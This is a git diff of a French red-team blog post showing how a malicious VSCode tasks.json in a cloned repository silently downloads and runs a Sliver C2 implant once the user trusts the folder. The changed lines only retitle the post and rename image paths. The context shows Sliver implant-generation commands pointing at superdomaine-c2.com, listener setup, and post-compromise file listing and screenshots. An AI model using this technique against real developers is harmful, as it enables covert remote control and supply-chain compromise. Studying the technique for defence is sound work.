@@ -1,13 +1,13 @@
 ---
 published: true
 layout: post
-title: "VSCode : Comment pirater en un clic un développeur"
+title: "VSCode : Comment pirater un développeur en un clic"
 description: "Cet article montre comment il est possible de détourner VSCode via le fichier tasks.json pour lui faire télécharger et exécuter un implant."
 lang: fr_FR
 categories: [CYBERSÉCURITÉ, RED TEAM]
 tags: [cybersécurité, initial access, malware, obfuscation, penetration testing, red teaming, tasks.json, vscode, windows]
 ---
-![VSCode : Comment pirater en un clic un développeur](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/illustration_article_vscode_tasks_json.png)
+![VSCode : Comment pirater un développeur en un clic](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/illustration_article_vscode_tasks_json.png)
 
 Dans le monde de la cybersécurité et du Red Teaming, les développeurs sont des cibles de choix. Possédant souvent des privilèges élevés, des accès aux pipelines CI/CD et des clés SSH sensibles, leur compromission peut mener à une attaque de la supply chain dévastatrice. Aujourd'hui, nous explorons une technique redoutable : l'utilisation du fichier `tasks.json` de Visual Studio Code pour exécuter un implant Sliver.
 
@@ -21,7 +21,7 @@ Pour cette démonstration, **Sliver** qui est un framework de Command & Control 
 
 Lancement du framework C2 sliver avec la commande `sliver` :
 
-![lancement_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/lancement_sliver.png)
+![lancement_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/lancement_sliver.png)
 
 
 Tout d'abord, l'implant (le *payload*) doit être généré. Dans le terminal Sliver, la commande suivante est entrée pour créer un binaire Windows communiquant via HTTP :
@@ -30,15 +30,15 @@ generate --http superdomaine-c2.com --os linux -a amd64 --name vscode-tasks
 ```
 Le résultat est le suivant :
 
-![generation_implant_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/generation_implant_linux_sliver.png)
+![generation_implant_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/generation_implant_linux_sliver.png)
 
 L'implant est alors visible dans la liste grâce à la commande `implants` :
 
-![affichage_liste_implants_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_liste_implants_sliver.png)
+![affichage_liste_implants_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_liste_implants_sliver.png)
 
 Afin de réceptionner la connexion entrante du poste compromis, un serveur d'écoute doit être activé sur le serveur C2 grâce à la commande `https` :
 
-![lancement_listener_https_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/lancement_listener_https_sliver.png)
+![lancement_listener_https_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/lancement_listener_https_sliver.png)
 
 # Exploitation de la fonctionnalité tasks.json
 Le vecteur d'attaque se loge dans le répertoire `.vscode/` situé à la racine du projet. Ce dossier contient les configurations spécifiques à l'espace de travail.
@@ -107,36 +107,36 @@ Le bloc `presentation` est configuré pour rendre l'opération totalement invisi
 
 Le projet Git est cloné côté victime avec la commande `git clone https://github.com/CLeBeRFR/article-tasks.git` :
 
-![git_clone_projet_backdoor.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/git_clone_projet_backdoor.png)
+![git_clone_projet_backdoor.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/git_clone_projet_backdoor.png)
 
 
 Lors de l'ouverture, une fenêtre d'avertissement VSCode apparaît :
 
-![autorisation_trust_projet_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/autorisation_trust_projet_vscode.png)
+![autorisation_trust_projet_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/autorisation_trust_projet_vscode.png)
 
 Lorsque l'utilisateur clique sur "Yes, I trust the authors", les commandes sont exécutées et le serveur web reçoit la requête :
 
-![listener_serveur_web.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/listener_serveur_web.png)
+![listener_serveur_web.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/listener_serveur_web.png)
 
 Le listener Sliver réceptionne la backdoor :
-![reception_listener_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/reception_listener_linux_sliver.png)
+![reception_listener_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/reception_listener_linux_sliver.png)
 
 
 Il est possible de visualiser les sessions ouvertes avec `sessions` :
 
-![affichage_sessions_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_sessions_sliver.png)
+![affichage_sessions_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_sessions_sliver.png)
 
 Il est alors possible d'intéragir avec la session avec `use <ID de session>` :
 
 Il est possible de sélectionner la session et d'intéragir avec, par exemple exécuter la commande `ls` :
-![selection_session_sliver_linux.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/selection_session_sliver_linux.png)
+![selection_session_sliver_linux.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/selection_session_sliver_linux.png)
 
 L'implant pour Windows est généré via la commande Sliver :
 ```bash
 generate --http superdomaine-c2.com --os windows --format exe -a amd64 --name vscode-tasks-windows
 ```
 
-![generation_implant_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/generation_implant_windows_sliver.png)
+![generation_implant_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/generation_implant_windows_sliver.png)
 
 
 Le fichier JSON `tasks.json` est modifié :
@@ -192,23 +192,23 @@ Le fichier JSON `tasks.json` est modifié :
 ```
 
 Aucun élément laisse transparaître sur VSCode l'exécution du binaire :
-![affichage_projet_backdoor_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_projet_backdoor_vscode.png)
+![affichage_projet_backdoor_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_projet_backdoor_vscode.png)
 
 Rien  ne se passe sur VSCode, pourtant, Sliver reçoit bien la connexion :
 
-![affichage_sessions_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_sessions_windows_sliver.png)
+![affichage_sessions_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_sessions_windows_sliver.png)
 
 Il est ainsi possible de lister les fichiers de la machine Windows par exemple :
 
-![listing_fichiers_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/listing_fichiers_windows_sliver.png)
+![listing_fichiers_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/listing_fichiers_windows_sliver.png)
 
 
 Il est également possible de prendre des captures d'écran de la cible :
 
-![capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/capture_ecran_windows_sliver.png)
+![capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/capture_ecran_windows_sliver.png)
 
 Ce qui était affiché à l'écran de la victime est alors disponible :
-![contenu_capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/contenu_capture_ecran_windows_sliver.png)
+![contenu_capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/contenu_capture_ecran_windows_sliver.png)
 
 # Scénario d'attaque : Le "One-Click" Compromise
 ## L'attaque se déroule généralement en quatre phases :
